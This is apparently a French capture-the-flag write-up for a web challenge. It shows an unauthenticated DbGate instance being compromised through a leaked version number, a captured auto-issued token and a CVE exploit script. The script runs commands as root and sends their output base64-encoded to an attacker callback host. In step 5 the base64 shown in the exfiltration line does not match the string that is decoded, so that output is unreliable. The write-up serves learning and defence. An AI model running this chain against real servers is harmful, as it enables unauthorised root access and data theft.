---
title: Azonto
category: Web
ctf: brCTF 2026
competition: brctf-2026
date: 2026-10-01
summary: An exposed DbGate instance leaks its version, pointing to an unauthenticated RCE (CVE-2026-47668) that reads the root flag through the /runners/start endpoint.
tags:
- brctf-2026
- web
- rce
- cve
lang: fr
---

## Informations

- **Catégorie :** Web
- **Flag :** `ETSCTF_eaca3f03a0d613412cb7a0f945e8ebcd`

---

## 1. Reconnaissance

```bash
nmap -sC -sV <IP>
```

```text
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: DbGate
|_http-cors: HEAD
```

Le port 3000 sert **DbGate**, une solution open source de gestion de bases de données. En y accédant, on est déjà connecté — aucune authentification n'est demandée.

![Screenshot](./images/obsidian/azonto/pasted-image-20261001224448.png)

---

## 2. Fuite de version via `/config/get`

En cartographiant l'application avec Burp Suite, une requête POST `/config/get` ressort. Sa réponse contient des informations de configuration intéressantes :

```json
{"configurationError":null,"logoutUrl":null,"login":null,"isBasicAuth":false,"isAdminLoginForm":false,"isAdminPasswordMissing":false,"skipAllAuth":false,"connectionsFilePath":"/root/.dbgate/connections.jsonl","supportCloudAutoUpgrade":false,"allowPrivateCloud":false,"version":"7.1.8","buildTime":"2026-04-09T13:37:15.711Z","redirectToDbGateCloudLogin":false,"preferrendLanguage":null}
```

![Screenshot](./images/obsidian/azonto/pasted-image-20261001225813.png)

La version exposée est **DbGate 7.1.8**. Une recherche rapide indique l'existence de **CVE-2026-47668**, un RCE non authentifié exploitant l'endpoint `/runners/start`.

---

## 3. Contourner l'authentification sur `/runners/start`

Un accès direct à l'endpoint échoue :

```http
http://<IP>:3000/runners/start
```

L'erreur indique qu'un cookie d'autorisation est manquant. En observant le trafic normal de l'application, une requête POST vers `/auth/login` est envoyée automatiquement à la connexion :

```json
{"amoid":"none","isAdminPage":false}
```

![Screenshot](./images/obsidian/azonto/pasted-image-20261001225552.png)

Elle renvoie un token d'accès, utilisé ensuite pour les requêtes suivantes :

```json
{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbW9pZCI6Im5vbmUiLCJpYXQiOjE3OTA4OTAxMDgsImV4cCI6MTc5MDk3NjUwOH0.7f1A965N3gFhYMqB8dO7gLVfKGhGQMF_dpFenJkHQxk"}
```

Avec ce token, `/runners/start` répond différemment : il refuse le GET, mais accepte un POST.

---

## 4. Exploitation — CVE-2026-47668

```bash
python CVE-2026-47668.py --cli -u http://<IP>:3000 --callback-host YOUR_IP --cmd "id"
```

La vulnérabilité est confirmée, avec la sortie exfiltrée encodée en base64 :

```text
[★] EXFIL [http://10.0.10.5:3000/?data=dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCk=] from 10.0.10.5: ''
```

```bash
echo 'dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCk=' | base64 -d
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Le service tourne en **root**.

---

## 5. Lecture du flag

```bash
python CVE-2026-47668.py --cli -u http://10.0.10.5:3000 --callback-host 10.10.0.230 --cmd "ls -la /root"
```

```text
[★] EXFIL [http://10.0.10.5:3000/?data=eyJzZXJ2ZXIiOiJsb2NhbGhvc3QiLCJlbmdpbmUiOiJyZWRpc0BkYmdhdGUtcGx1Z2luLXJlZGlzIiwicG9ydCI6IjYzNzkiLCJ1bnNhdmVkIjp0cnVlLCJfaWQiOiI3ZDMwNjA5Mi0xZTYwLTRiYjctODE3Ni03ZTEyMDI1ZWNiN2MifQ==] from 10.0.10.5: ''
```

```bash
echo 'dG90YWwgMzIKZHJ3eC0tLS0tLSAxIHJvb3Qgcm9vdCA0MDk2IE9jdCAgMSAyMToyNyAuCmRyd3hyLXhyLXggMSByb290IHJvb3QgNDA5NiBPY3QgIDEgMjE6MjcgLi4KLXJ3LXItLXItLSAxIHJvb3Qgcm9vdCAgNTcxIEFwciAxMCAgMjAyMSAuYmFzaHJjCmRyd3hyLXhyLXggMyByb290IHJvb3QgNDA5NiBTZXAgMTggMTQ6MTQgLmNhY2hlCmRyd3hyLXhyLXggNiByb290IHJvb3QgNDA5NiBPY3QgIDEgMjE6NDEgLmRiZ2F0ZQpkcnd4ci14ci14IDUgcm9vdCByb290IDQwOTYgU2VwIDE4IDE0OjE0IC5ucG0KLXJ3LXItLXItLSAxIHJvb3Qgcm9vdCAgMTYxIEp1bCAgOSAgMjAxOSAucHJvZmlsZQotcnctci0tci0tIDEgcm9vdCByb290ICAgIDAgU2VwIDE4IDE0OjEyIEVUU0NURl9lYWNhM2YwM2EwZDYxMzQxMmNiN2EwZjk0NWU4ZWJjZA==' | base64 -d
```

```text
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x 3 root root 4096 Sep 18 14:14 .cache
drwxr-xr-x 6 root root 4096 Oct  1 21:41 .dbgate
drwxr-xr-x 5 root root 4096 Sep 18 14:14 .npm
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw-r--r-- 1 root root    0 Sep 18 14:12 ETSCTF_eaca3f03a0d613412cb7a0f945e8ebcd
```

![Screenshot](./images/obsidian/azonto/pasted-image-20261001231128.png)

Le flag est, une fois de plus, le **nom du fichier** (0 octet).

**Flag :** `ETSCTF_eaca3f03a0d613412cb7a0f945e8ebcd`

---

## Récapitulatif de la chaîne d'exploitation

1. **nmap** → port 3000 = DbGate, accessible sans authentification.
2. **`/config/get`** → fuite de version (7.1.8).
3. Version vulnérable à **CVE-2026-47668** (RCE non authentifié via `/runners/start`).
4. **Capture du token** émis par `/auth/login`, requis pour atteindre l'endpoint vulnérable.
5. **Exploitation** → commandes exécutées en root, sortie exfiltrée en base64.
6. **Flag** → nom de fichier dans `/root`.

> **Concept clé :** un panneau d'administration accessible sans authentification (même avec un jeton généré automatiquement côté client) expose toute faille applicative à n'importe qui. Garder ses outils de gestion de base de données à jour et jamais exposés directement sur le réseau aurait suffi à bloquer cette chaîne.

---

***— 3ch0***
